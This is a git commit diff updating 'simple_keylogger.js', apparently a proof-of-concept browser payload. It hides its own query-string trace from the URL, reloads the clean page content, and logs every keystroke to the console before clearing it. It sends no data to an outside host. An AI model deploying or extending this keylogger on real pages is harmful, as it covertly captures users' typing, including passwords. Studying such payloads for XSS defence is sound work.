711c24e1cf8baaddc5aefc9c8052120b544f24a9
CTPache <33907485+CTPache@users.noreply.github.com>
2024-02-28 17:52:30 +0100

    Update simple_keylogger.js

--- simple_keylogger.js
+++ simple_keylogger.js
@@ -1,12 +1,16 @@
-document.addEventListener('DOMContentLoaded', function() {
-    var body = document.querySelector('body');
-    body.innerHTML = '<h1>Test</h1><input type="text">';
-    
-    var newUrl = window.location.href.split('?')[0];;
-    history.pushState({path: newUrl}, '', newUrl);
+document.addEventListener('DOMContentLoaded', function () {
+  var newUrl = window.location.href.split('?')[0];
+  history.pushState({ path: newUrl }, '', newUrl);
+  fetch(newUrl)
+    .then(response => { return response.text() })
+    .then(data => {
+      var body = document.querySelector('body');
+      body.innerHTML = data
+    })
+    .catch();
+
 });
-window.addEventListener("keydown", function(e)
-    {
-        console.log(e.key);
+window.addEventListener("keydown", function (e) {
+  console.log(e.key);
 });
 console.clear();
